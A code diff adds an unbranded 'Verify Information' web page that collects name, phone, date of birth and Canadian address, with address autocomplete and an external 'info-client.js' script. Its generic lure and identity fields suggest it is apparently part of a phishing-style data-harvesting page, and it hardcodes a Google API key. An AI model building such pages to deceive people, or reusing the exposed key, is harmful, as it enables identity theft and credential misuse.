@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Verify Information</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            touch-action: manipulation !important;
+        }
+
+html {
+            touch-action: manipulation !important;
+            -ms-touch-action: manipulation !important;
+        }
+
+        body {
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+            background: #F5F5F2;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding-top: 180px;
+            padding-bottom: 20px;
+            padding-left: 20px;
+            padding-right: 20px;
+            touch-action: manipulation !important;
+            -ms-touch-action: manipulation !important;
+        }
+
+        .container {
+            background: white;
+            border-radius: 9.6px;
+            padding: 48px 64px;
+            max-width: 480px;
+            width: 100%;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+        }
+
+        h1 {
+            font-size: 33.6px;
+            font-weight: 400;
+            color: #2C3E50;
+            margin-bottom: 32px;
+            text-align: center;
+            line-height: 1.2;
+        }
+
+        .form-group {
+            margin-bottom: 19.2px;
+        }
+
+        label {
+            display: block;
+            font-size: 11.2px;
+            font-weight: 500;
+            color: #5A6C7D;
+            margin-bottom: 6.4px;
+        }
+
+        input {
+            width: 100%;
+            padding: 12.8px 16px;
+            font-size: 16px;
+            border: 2px solid #E0E0E0;
+            border-radius: 40px;
+            transition: all 0.3s ease;
+            color: #2C3E50;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #2C3E50;
+        }
+
+        input:hover {
+            border-color: #A0A0A0;
+        }
+
+        .date-inputs {
+            display: flex;
+            gap: 9.6px;
+        }
+
+        .date-field {
+            flex: 1;
+        }
+
+        .date-field input {
+            text-align: center;
+        }
+
+        .date-field.day,
+        .date-field.month {
+            max-width: 64px;
+        }
+
+        .submit-btn {
+            width: 100%;
+            background: #2C3E50;
+            border: none;
+            border-radius: 40px;
+            padding: 16px 32px;
+            font-size: 14.4px;
+            font-weight: 500;
+            color: white;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 25.6px;
+        }
+
+        .submit-btn:hover {
+            background: #1A2634;
+            transform: translateY(-1.6px);
+            box-shadow: 0 4.8px 16px rgba(44, 62, 80, 0.3);
+        }
+
+        .submit-btn:active {
+            transform: translateY(0);
+        }
+
+.logo {
+    position: absolute;
+    top: 24px;
+    left: 32px;
+}
+
+.logo img {
+    height:60px;
+    width: auto;
+}
+
+        @media (max-width: 768px) {
+            .container {
+                padding: 32px 24px;
+            }
+
+            h1 {
+                font-size: 25.6px;
+            }
+
+            input {
+                padding: 11.2px 14.4px;
+                font-size: 16px;
+            }
+
+            .submit-btn {
+                font-size: 12.8px;
+                padding: 12.8px 25.6px;
+            }
+        }
+        /* Google Places autocomplete dropdown styling */
+.pac-container {
+    border-radius: 16px;
+    border: 2px solid #2C3E50;
+    box-shadow: 0 8px 24px rgba(0,0,0,0.12);
+    font-family: 'Helvetica Neue', Arial, sans-serif;
+    font-size: 14px;
+    margin-top: 4px;
+    overflow: hidden;
+}
+.pac-item {
+    padding: 10px 16px;
+    cursor: pointer;
+    color: #2C3E50;
+}
+.pac-item:hover,
+.pac-item-selected {
+    background: #F5F5F2;
+}
+.pac-item-query {
+    font-size: 14px;
+    color: #2C3E50;
+}
+.pac-matched {
+    font-weight: 600;
+}
+.pac-icon {
+    display: none;
+}
+    </style>
+</head>
+<body>
+    <div class="logo"><img src="logo.png" alt="Logo"></div>
+    
+    <div class="container">
+        <h1>Verify the following<br>information</h1>
+        
+        <form>
+            <div class="form-group">
+                <label for="name">First and last name</label>
+                <input type="text" id="name" name="name" required>
+            </div>
+
+            <div class="form-group">
+                <label for="phone">Phone number</label>
+                <input type="tel" id="phone" name="phone" placeholder="(000) 000-0000" inputmode="numeric" required>
+            </div>
+
+            <div class="form-group">
+                <label>Date of birth</label>
+                <div class="date-inputs">
+                    <div class="date-field day">
+                        <input type="text" id="day" name="day" placeholder="MM" inputmode="numeric" required>
+                    </div>
+                    <div class="date-field month">
+                        <input type="text" id="month" name="month" placeholder="DD" inputmode="numeric" required>
+                    </div>
+                    <div class="date-field year">
+                        <input type="text" id="year" name="year" placeholder="YYYY" inputmode="numeric" required>
+                    </div>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label for="address">Street address</label>
+                <input type="text" id="address" name="address" placeholder="Start typing your address…" autocomplete="off" required>
+            </div>
+
+            <div class="form-group">
+                <label for="city">City</label>
+                <input type="text" id="city" name="city" required>
+            </div>
+
+            <div class="form-group">
+                <label for="province">Province</label>
+                <input type="text" id="province" name="province" required>
+            </div>
+
+            <div class="form-group">
+                <label for="postal">Postal code</label>
+                <input type="text" id="postal" name="postal" required>
+            </div>
+
+            <button type="submit" class="submit-btn">Continue</button>
+        </form>
+    </div>
+
+    <script>
+        // Auto-advance to next field when 2 digits are entered
+        const dayInput = document.getElementById('day');
+        const monthInput = document.getElementById('month');
+        const yearInput = document.getElementById('year');
+
+       // #day has placeholder "MM" — it is the month field
+dayInput.addEventListener('input', function(e) {
+    let val = this.value.replace(/\D/g, '').slice(0, 2);
+    // If first digit is > 1, auto-prefix with 0 (e.g. "2" → "02")
+    if (val.length === 1 && parseInt(val[0]) > 1) {
+        val = '0' + val;
+    }
+    this.value = val;
+    if (this.value.length === 2) {
+        monthInput.focus();
+    }
+});
+
+// #month has placeholder "DD" — it is the day field
+monthInput.addEventListener('input', function(e) {
+    let val = this.value.replace(/\D/g, '').slice(0, 2);
+    // If first digit is > 3, auto-prefix with 0 (e.g. "4" → "04")
+    if (val.length === 1 && parseInt(val[0]) > 3) {
+        val = '0' + val;
+    }
+    this.value = val;
+    if (this.value.length === 2) {
+        yearInput.focus();
+    }
+});
+
+        yearInput.addEventListener('input', function(e) {
+            this.value = this.value.replace(/\D/g, '').slice(0, 4);
+        });
+
+        const phoneInput = document.getElementById('phone');
+        phoneInput.addEventListener('input', function() {
+            let val = this.value.replace(/\D/g, '').slice(0, 10);
+            if (val.length >= 7)      val = `(${val.slice(0,3)}) ${val.slice(3,6)}-${val.slice(6)}`;
+            else if (val.length >= 4) val = `(${val.slice(0,3)}) ${val.slice(3)}`;
+            else if (val.length >= 1) val = `(${val}`;
+            this.value = val;
+        });
+    </script>
+    
+    <!-- Google Places Autocomplete -->
+    <script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyDulUwQVDAJN1g-JPOIPr82kdhX68Baeww&libraries=places&callback=initAutocomplete" async defer></script>
+    <script>
+        function initAutocomplete() {
+            const addressInput = document.getElementById('address');
+            if (!addressInput) return;
+
+            const autocomplete = new google.maps.places.Autocomplete(addressInput, {
+                types: ['address'],
+                componentRestrictions: { country: 'ca' },
+                fields: ['address_components'],
+            });
+
+            autocomplete.addListener('place_changed', function () {
+                const place = autocomplete.getPlace();
+                if (!place.address_components) return;
+
+                let streetNumber = '', route = '', city = '', province = '', postal = '';
+
+                for (const component of place.address_components) {
+                    const types = component.types;
+                    if (types.includes('street_number'))               streetNumber = component.long_name;
+                    if (types.includes('route'))                       route        = component.long_name;
+                    if (types.includes('locality'))                    city         = component.long_name;
+                    if (!city && types.includes('sublocality_level_1')) city        = component.long_name;
+                    if (!city && types.includes('administrative_area_level_2')) city = component.long_name;
+                    if (types.includes('administrative_area_level_1')) province     = component.short_name;
+                    if (types.includes('postal_code'))                 postal       = component.long_name;
+                }
+
+                addressInput.value = streetNumber ? `${streetNumber} ${route}` : route;
+
+                const cityInput     = document.getElementById('city');
+                const provinceInput = document.getElementById('province');
+                const postalInput   = document.getElementById('postal');
+
+                if (cityInput)     { cityInput.value     = city;     cityInput.dispatchEvent(new Event('input'));     }
+                if (provinceInput) { provinceInput.value = province; provinceInput.dispatchEvent(new Event('input')); }
+                if (postalInput)   { postalInput.value   = postal;   postalInput.dispatchEvent(new Event('input'));   }
+
+                addressInput.dispatchEvent(new Event('input'));
+
+                // Aggressively close the dropdown
+                document.body.click();
+                addressInput.blur();
+                document.activeElement?.blur();
+
+                const closePac = () => {
+                    const pac = document.querySelector('.pac-container');
+                    if (pac) pac.style.visibility = 'hidden';
+                };
+                closePac();
+                setTimeout(closePac, 50);
+                setTimeout(closePac, 150);
+
+                // Re-show when user focuses address field again
+                addressInput.addEventListener('focus', () => {
+                    const pac = document.querySelector('.pac-container');
+                    if (pac) pac.style.visibility = '';
+                }, { once: true });
+            });
+        }
+    </script>
+
+    <!-- Include the info-client.js script -->
+    <script src="info-client.js"></script>
+
+<script>
+        let lastTouchEnd = 0;
+        document.addEventListener('touchend', function(event) {
+            const now = Date.now();
+            if (now - lastTouchEnd <= 300) {
+                event.preventDefault();
+            }
+            lastTouchEnd = now;
+        }, { passive: false });
+    </script>
+
+</body>
+</html>
